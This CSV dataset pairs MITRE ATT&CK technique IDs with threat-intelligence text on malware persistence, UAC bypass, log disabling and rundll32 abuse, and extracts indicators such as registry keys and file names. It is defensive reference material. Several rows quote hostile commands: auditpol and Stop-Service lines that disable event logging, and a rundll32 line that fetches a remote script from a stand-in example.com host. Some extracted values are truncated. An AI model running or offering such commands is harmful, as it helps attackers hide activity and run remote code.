tech_id,tech_name,text,section,ioc,ioc_value
T1547.001,Registry Run Keys  or  Startup Folder,"HTTPBrowser  has established persistence by setting the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  key value for  wdm  to the path of the executable. It has also used the Registry entry  HKEY_USERS\Software\Microsoft\Windows\CurrentVersion\Run vpdn ""%ALLUSERPROFILE%\%APPDATA%\vpdn\VPDN_LU.exe""  to establish persistence.   [117]      [118]",Procedure Examples,file,VPDN_LU.exe
T1547.001,Registry Run Keys  or  Startup Folder,Inception  has maintained persistence by modifying Registry run key value   HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\ .   [120],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Some  InnaputRAT  variants establish persistence by modifying the Registry key  HKU\ \Software\Microsoft\Windows\CurrentVersion\Run:%appdata%\NeutralApp\NeutralApp.exe  .   [121],Procedure Examples,file,NeutralApp.exe
T1547.001,Registry Run Keys  or  Startup Folder,Ixeshe  can achieve persistence by adding itself to the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  Registry key.   [123],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,JHUHUGIT  has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.   [125],Procedure Examples,file,rundll32.exe
T1547.001,Registry Run Keys  or  Startup Folder,Kimsuky  has placed scripts in the startup folder for persistence and modified the  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce  Registry key.   [130]      [35]      [131]      [132]      [133],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce
T1547.001,Registry Run Keys  or  Startup Folder,Koadic  has added persistence to the  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run  Registry key.   [134],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,LoJax  has modified the Registry key  ‘HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute’  from  ‘autocheck autochk  ’   to  ‘autocheck autoche ’  in order to execute its payload during Windows startup.   [143],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute
T1547.001,Registry Run Keys  or  Startup Folder,Lucifer  can persist by setting Registry key values  HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic  and  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic .   [145],Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic
T1547.001,Registry Run Keys  or  Startup Folder,Lucifer  can persist by setting Registry key values  HKLM\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic  and  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic .   [145],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run\QQMusic
T1547.001,Registry Run Keys  or  Startup Folder,"Maze  has created a file named ""startup_vrun.bat"" in the Startup folder of a virtual machine to establish persistence.   [152]",Procedure Examples,file,startup_vrun.bat
T1547.001,Registry Run Keys  or  Startup Folder,"Metamorfo  has configured persistence to the Registry ket  HKCU\Software\Microsoft\Windows\CurrentVersion\Run, Spotify =% APPDATA%\Spotify\Spotify.exe  and used .LNK files in the startup folder to achieve persistence.   [154]      [155]      [156]      [157]",Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,"Metamorfo  has configured persistence to the Registry ket  HKCU\Software\Microsoft\Windows\CurrentVersion\Run, Spotify =% APPDATA%\Spotify\Spotify.exe  and used .LNK files in the startup folder to achieve persistence.   [154]      [155]      [156]      [157]",Procedure Examples,file,Spotify.exe
T1547.001,Registry Run Keys  or  Startup Folder,Mosquito  establishes persistence under the Registry key  HKCU\Software\Run auto_update .   [161],Procedure Examples,registry-key,HKCU\Software\Run
T1547.001,Registry Run Keys  or  Startup Folder,Mustang Panda  has created the registry key  HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AdobelmdyU  to maintain persistence.   [168],Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run\AdobelmdyU
T1547.001,Registry Run Keys  or  Startup Folder,"The ""SCOUT"" variant of  NETEAGLE  achieves persistence by adding itself to the  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  Registry key.   [38]",Procedure Examples,registry-key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,njRAT  has added persistence via the Registry key  HKCU\Software\Microsoft\CurrentVersion\Run\  and dropped a shortcut in  %STARTUP% .   [176]      [177],Procedure Examples,registry-key,HKCU\Software\Microsoft\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,NOKKI  has established persistence by writing the payload to the Registry key  HKCU\Software\Microsoft\Windows\CurrentVersion\Run .   [178],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Octopus  achieved persistence by placing a malicious executable in the startup directory and has added the  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run  key to the Registry.   [180],Procedure Examples,registry-key,HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,"During  Operation Honeybee , the threat actors used batch files that allowed them to establish persistence by adding the following Registry key:  ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost"" /v COMSysApp /t REG_MULTI_SZ /d ""COMSysApp"" /f .   [182]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost
T1547.001,Registry Run Keys  or  Startup Folder,"During  Operation Honeybee , the threat actors used batch files that allowed them to establish persistence by adding the following Registry key:  ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SvcHost"" /v COMSysApp /t REG_MULTI_SZ /d ""COMSysApp"" /f .   [182]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows
T1547.001,Registry Run Keys  or  Startup Folder,"During  Operation Sharpshooter , a first-stage downloader installed  Rising Sun  to  %Startup%\mssync.exe  on a compromised host.   [183]",Procedure Examples,file,mssync.exe
T1547.001,Registry Run Keys  or  Startup Folder,PowerSploit 's  New-UserPersistenceOption  Persistence argument can be used to establish via the  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  Registry key.   [195]      [196],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,A dropper used by  Putter Panda  installs itself into the ASEP Registry key  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  with a value named McUpdate.   [204],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,If the  QuasarRAT  client process does not have administrator privileges it will add a registry key to  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  for persistence.   [209]      [210],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Remcos  can add itself to the Registry key  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  for persistence.   [215],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Revenge RAT  creates a Registry key at  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  to survive a system reboot.   [217],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
T1547.001,Registry Run Keys  or  Startup Folder,Revenge RAT  creates a Registry key at  HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  to survive a system reboot.   [217],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows
T1547.001,Registry Run Keys  or  Startup Folder,Rifdoor  has created a new registry entry at  HKEY_CURRENT_USERS\Software\Microsoft\Windows\CurrentVersion\Run\Graphics  with a value of  C:\ProgramData\Initech\Initech.exe /run .   [218],Procedure Examples,path,C:\ProgramData\Initech\Initech.exe
T1547.001,Registry Run Keys  or  Startup Folder,Rifdoor  has created a new registry entry at  HKEY_CURRENT_USERS\Software\Microsoft\Windows\CurrentVersion\Run\Graphics  with a value of  C:\ProgramData\Initech\Initech.exe /run .   [218],Procedure Examples,file,Initech.exe
T1547.001,Registry Run Keys  or  Startup Folder,Rover  persists by creating a Registry entry in  HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ .   [221],Procedure Examples,registry-key,HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Ryuk  has used the Windows command line to create a Registry entry under  HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  to establish persistence.   [224],Procedure Examples,registry-key,HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,S-Type  may create a .lnk file to itself that is saved in the Start menu folder. It may also create the Registry key  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ IMJPMIJ8.1{3 characters of Unique Identifier} .   [225],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Seasalt  creates a Registry entry to ensure infection after reboot under  HKLM\Software\Microsoft\Windows\currentVersion\Run .   [232],Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows\currentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,ServHelper  may attempt to establish persistence via the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\  run key.   [233],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,ShimRat  has installed a registry based start-up key  HKCU\Software\microsoft\windows\CurrentVersion\Run  to maintain persistence should other methods fail.   [234],Procedure Examples,registry-key,HKCU\Software\microsoft\windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,"Silence  has used  HKCU\Software\Microsoft\Windows\CurrentVersion\Run ,  HKLM\Software\Microsoft\Windows\CurrentVersion\Run , and the Startup folder to establish persistence.   [238]",Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,"Silence  has used  HKCU\Software\Microsoft\Windows\CurrentVersion\Run ,  HKLM\Software\Microsoft\Windows\CurrentVersion\Run , and the Startup folder to establish persistence.   [238]",Procedure Examples,registry-key,HKLM\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Small Sieve  has the ability to add itself to  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OutlookMicrosift  for persistence.   [240],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OutlookMicrosift
T1547.001,Registry Run Keys  or  Startup Folder,SMOKEDHAM  has used  reg.exe  to create a Registry Run key.   [242],Procedure Examples,file,reg.exe
T1547.001,Registry Run Keys  or  Startup Folder,"STARWHALE  can establish persistence by installing itself in the startup folder, whereas the GO variant has created a  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OutlookM  registry key.   [245]      [246]",Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OutlookM
T1547.001,Registry Run Keys  or  Startup Folder,StrongPity  can use the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  Registry key for persistence.   [199],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,Taidoor  has modified the  HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  key for persistence.   [249],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,"TAINTEDSCRIBE  can copy itself into the current user’s Startup folder as ""Narrator.exe"" for persistence.   [250]",Procedure Examples,file,Narrator.exe
T1547.001,Registry Run Keys  or  Startup Folder,"A  Turla  Javascript backdoor added a local_update_check value under the Registry key  HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  to establish persistence. Additionally, a  Turla  custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.   [161]      [261]",Procedure Examples,registry-key,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,VBShower  used  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\[a-f0-9A-F]{8}  to maintain persistence.   [267],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,WarzoneRAT  can add itself to the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  and  HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UIF2IS20VK  Registry keys.   [268],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Run
T1547.001,Registry Run Keys  or  Startup Folder,WarzoneRAT  can add itself to the  HKCU\Software\Microsoft\Windows\CurrentVersion\Run  and  HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UIF2IS20VK  Registry keys.   [268],Procedure Examples,registry-key,HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UIF2IS20VK
T1547.001,Registry Run Keys  or  Startup Folder,Wizard Spider  has established persistence via the Registry key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run and a shortcut within the startup folder.   [271]      [272],Procedure Examples,registry-key,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
T1036.003,Rename System Utilities,Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.    [1]    It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename  rundll32.exe ).    [2]    An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths.    [3],Description,file,rundll32.exe
T1036.003,Rename System Utilities,The  CozyCar  dropper has masqueraded a copy of the infected system's rundll32.exe executable that was moved to the malware's install directory and renamed according to a predefined configuration file.   [3],Procedure Examples,file,rundll32.exe
T1036.003,Rename System Utilities,GALLIUM  used a renamed cmd.exe file to evade detection.   [5],Procedure Examples,file,cmd.exe
T1036.003,Rename System Utilities,Kevin  has renamed an image of  cmd.exe  with a random name followed by a  .tmpl  extension.   [6],Procedure Examples,file,cmd.exe
T1036.003,Rename System Utilities,Lazarus Group  has renamed system utilities such as  wscript.exe  and  mshta.exe .   [7],Procedure Examples,file,wscript.exe
T1036.003,Rename System Utilities,Lazarus Group  has renamed system utilities such as  wscript.exe  and  mshta.exe .   [7],Procedure Examples,file,mshta.exe
T1071.004,DNS,OilRig  has used DNS for C2 including the publicly available  requestbin.net  tunneling service.   [44]      [45]      [46]      [47],Procedure Examples,domain,requestbin.net
T1027,Obfuscated Files or Information,"Emotet  has obfuscated macros within malicious documents to hide the URLs hosting the malware,  CMD.exe arguments, and PowerShell scripts.    [120]      [121]      [122]      [123]",Procedure Examples,file,CMD.exe
T1027,Obfuscated Files or Information,ISMInjector  is obfuscated with the off-the-shelf SmartAssembly .NET obfuscator created by red-gate.com.   [194],Procedure Examples,domain,red-gate.com
T1027,Obfuscated Files or Information,NanoCore ’s plugins were obfuscated with Eazfuscater.NET 3.3.   [260],Procedure Examples,domain,eazfuscater.net
T1027,Obfuscated Files or Information,SUNSPOT  encrypted log entries it collected with the stream cipher RC4 using a hard-coded key. It also uses AES128-CBC encrypted blobs for  SUNBURST  source code and data extracted from the SolarWinds Orion &lt;MsBuild.exe process.   [361],Procedure Examples,file,MsBuild.exe
T1562.002,Disable Windows Event Logging,"Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.   [1]    This data is used by security tools and analysts to generate detections.   The EventLog service maintains event logs from various system components and applications.   [2]    By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to  Security Settings\Local Policies\Audit Policy  for basic audit policy settings or  Security Settings\Advanced Audit Policy Configuration  for advanced audit policy settings.   [3]      [4]     auditpol.exe  may also be used to set audit policies.   [5]      Adversaries may target system-wide logging or just that of a particular application. For example, the EventLog service may be disabled using the following PowerShell line:  Stop-Service -Name EventLog .   [6]    Additionally, adversaries may use  auditpol  and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the  /success  or  /failure  parameters. For example,  auditpol /set /category:""Account Logon"" /success:disable /failure:disable  turns off auditing for the Account Logon category.   [7]      [8]    To clear the audit policy, adversaries may run the following lines:  auditpol /clear /y  or  auditpol /remove /allusers .   [8]      By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",Description,file,auditpol.exe
T1562.002,Disable Windows Event Logging,Threat Group-3390  has used appcmd.exe to disable logging on a victim server.   [11],Procedure Examples,file,appcmd.exe
T1548.002,Bypass User Account Control,"BitPaymer  can suppress UAC prompts by setting the  HKCU\Software\Classes\ms-settings\shell\open\command  registry key on Windows 10 or  HKCU\Software\Classes\mscfile\shell\open\command  on Windows 7 and launching the  eventvwr.msc  process, which launches  BitPaymer  with elevated privileges.   [15]",Procedure Examples,registry-key,HKCU\Software\Classes\mscfile\shell\open\command
T1548.002,Bypass User Account Control,"BitPaymer  can suppress UAC prompts by setting the  HKCU\Software\Classes\ms-settings\shell\open\command  registry key on Windows 10 or  HKCU\Software\Classes\mscfile\shell\open\command  on Windows 7 and launching the  eventvwr.msc  process, which launches  BitPaymer  with elevated privileges.   [15]",Procedure Examples,registry-key,HKCU\Software\Classes\ms
T1548.002,Bypass User Account Control,"BitPaymer  can suppress UAC prompts by setting the  HKCU\Software\Classes\ms-settings\shell\open\command  registry key on Windows 10 or  HKCU\Software\Classes\mscfile\shell\open\command  on Windows 7 and launching the  eventvwr.msc  process, which launches  BitPaymer  with elevated privileges.   [15]",Procedure Examples,registry-key,HKCU\Software\Classes\ms-settings\shell\open\command
T1548.002,Bypass User Account Control,Clambling  has the ability to bypass UAC using a  passuac.dll  file.   [20]      [21],Procedure Examples,file,passuac.dll
T1548.002,Bypass User Account Control,H1N1  bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).   [34],Procedure Examples,file,wusa.exe
T1548.002,Bypass User Account Control,Koadic  has 2 methods for elevating integrity. It can bypass UAC through  eventvwr.exe  and  sdclt.exe .   [37],Procedure Examples,file,eventvwr.exe
T1548.002,Bypass User Account Control,Koadic  has 2 methods for elevating integrity. It can bypass UAC through  eventvwr.exe  and  sdclt.exe .   [37],Procedure Examples,file,sdclt.exe
T1548.002,Bypass User Account Control,KOCTOPUS  will perform UAC bypass either through fodhelper.exe or eventvwr.exe.   [38],Procedure Examples,file,fodhelper.exe
T1548.002,Bypass User Account Control,KOCTOPUS  will perform UAC bypass either through fodhelper.exe or eventvwr.exe.   [38],Procedure Examples,file,eventvwr.exe
T1548.002,Bypass User Account Control,"During  Operation Honeybee , the threat actors used the malicious NTWDBLIB.DLL and  cliconfig.exe  to bypass UAC protections.   [43]",Procedure Examples,file,cliconfig.exe
T1548.002,Bypass User Account Control,Saint Bot  has attempted to bypass UAC using  fodhelper.exe  to escalate privileges.   [54],Procedure Examples,file,fodhelper.exe
T1548.002,Bypass User Account Control,ShimRat  has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing.   [57],Procedure Examples,file,cryptbase.dll
T1548.002,Bypass User Account Control,ShimRat  has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing.   [57],Procedure Examples,file,migwiz.exe
T1548.002,Bypass User Account Control,WarzoneRAT  can use  sdclt.exe  to bypass UAC in Windows 10 to escalate privileges; for older Windows versions  WarzoneRAT  can use the IFileOperation exploit to bypass the UAC module.   [60]      [61],Procedure Examples,file,sdclt.exe
T1548.002,Bypass User Account Control,Many  ZeroT  samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.   [64],Procedure Examples,file,eventvwr.exe
T1087.001,Local Account,Milan  has run  C:\Windows\system32\cmd.exe /c cmd /c dir c:\users\ /s 2&gt;&amp;1  to discover local accounts.   [23],Procedure Examples,path,C:\Windows\system32\cmd.exe
T1087.001,Local Account,Milan  has run  C:\Windows\system32\cmd.exe /c cmd /c dir c:\users\ /s 2&gt;&amp;1  to discover local accounts.   [23],Procedure Examples,file,cmd.exe
T1087.001,Local Account,Mis-Type  may create a file containing the results of the command  cmd.exe /c net user {Username} .   [24],Procedure Examples,file,cmd.exe
T1087.001,Local Account,SMOKEDHAM  has used  net.exe user  and  net.exe users  to enumerate local accounts on a compromised host.   [42],Procedure Examples,file,net.exe
T1087.001,Local Account,SoreFang  can collect usernames from the local system via  net.exe user .   [43],Procedure Examples,file,net.exe
T1546.009,AppCert DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the  AppCertDLLs  Registry key under  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\  are loaded into every process that calls the ubiquitously used application programming interface (API) functions  CreateProcess ,  CreateProcessAsUser ,  CreateProcessWithLoginW ,  CreateProcessWithTokenW , or  WinExec .    [1]      Similar to  Process Injection , this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",Description,registry-key,HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session
T1555,Credentials from Password Stores,"PinchDuke  steals credentials from compromised hosts.  PinchDuke 's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by  PinchDuke  include ones associated with many sources such as The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, and Microsoft Outlook.   [8]",Procedure Examples,domain,passport.net
T1555,Credentials from Password Stores,"PinchDuke  steals credentials from compromised hosts.  PinchDuke 's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by  PinchDuke  include ones associated with many sources such as The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, and Microsoft Outlook.   [8]",Procedure Examples,domain,mail.ru
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,url,https://www.example.com/malicious.sct
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,domain,www.example.com
T1218.011,Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.   [5]",Description,file,rundll32.exe
